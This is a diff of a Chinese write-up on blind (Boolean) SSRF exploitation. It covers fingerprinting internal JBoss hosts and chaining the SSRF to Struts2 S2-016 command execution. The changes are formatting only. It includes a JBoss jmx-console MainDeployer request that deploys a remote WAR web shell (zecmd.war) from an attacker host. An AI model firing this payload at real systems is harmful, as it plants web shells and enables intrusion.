@@ -26,7 +26,7 @@ Wooyun上有很多SSRF典型的案例, 可以说让人拍案惊奇. 但是没有
 BOOL型SSRF与一般的SSRF的区别在步骤二应用识别, 步骤三攻击Payload和步骤四Payload Result. 一般的SSRF在应用识别阶段返回的信息相对较多, 比如Banner信息, HTTP Title信息,更有甚的会将整个HTTP的Reponse完全返回, 而Bool型SSRF的却永远只有True or False. 因为没有任何Response信息, 所以对于攻击Payload的选择也是有很多限制的, 不能选择需要和Response信息交互的Payload. 在此次搜狐SSRF的中, 我分别使用了JBOSS远程调用和Struts2 S2-016远程命令执行. 对于Bool型SSRF, 我们不能说Payload打过去就一定成功执行, 就算是返回True, 也不能保证Payload一定执行成功. 所以我们要验证Payload的执行状态信息.
 
 #### 0x03 Bool型SSRF利用方法
-1. 应用识别
+**应用识别**
 
 	{ 指纹1 + 指纹2 + 黑指纹 }
 
@@ -36,13 +36,14 @@ BOOL型SSRF与一般的SSRF的区别在步骤二应用识别, 步骤三攻击Pay
 
 Host = (A∩B) –(A∩B∩C) 即剔除jmx-console.host 和 invoker.host中存在于black.host的主机, 然后对jmx-console和invoker.host的主机取交集.
 
-2. 攻击Payload
+**攻击Payload**
 
 针对不用的应用我们需要加载不同的Payload, 但是大多数的攻击都是需要和Payload Result进行交互的. 这类Payload是没有办法用在此处的, 我们需要的是不需要和Payload Result进行交互的Payload. 我可以想到的两种应用比较广泛的Payload有JBOSS和Struts2漏洞.
 
 JBoss Payload:
 
-	/jmx-console/HtmlAdaptor?action=invokeOp&name=jboss.system%3Aservice%3DMainDeployer&methodIndex=3&arg0=http%3A%2F%2F192.168.1.2%2Fzecmd.war
+`/jmx-console/HtmlAdaptor?action=invokeOp&name=jboss.system%3Aservice%3DMainDeployer&methodIndex=3&arg0=http%3A%2F%2F192.168.1.2%2Fzecmd.war`
+
 通过JBOSS HtmlAdaptor接口直接部署远程war包, 我们可以通过access.log去验证war包是否成功部署.下面就是通过SSRF去执行不同的命令.还有一种方式,就是我们可以通过我们服务器的access.log日志获取到远程服务器对应的公网IP, 有时也会有一些意外惊喜.
 
 Struts2 Payload:
@@ -51,7 +52,7 @@ Struts2 Payload:
 
 Struts2漏洞的影响大家都懂的, 通过URL直接远程命令执行, 想打那里就打那里.
 
-3. Payload Result
+**Payload Result**
 
 获取Payload Result是十分有必要的, 这里的Payload Result和非Bool型SSRF的Result不是一个意思. 对于Bool型SSRF, 服务器端返回的数据永远只有True和False, 我们是可以通过返回的True或者False来判断Payload的执行状态, 但是这样的判断标准是无法让人信服的. 能否有一种方法能够精确的判断Payload的执行状态,而且能够返回Payload Result. 对于Struts2我找到了一种可利用的方法.
 
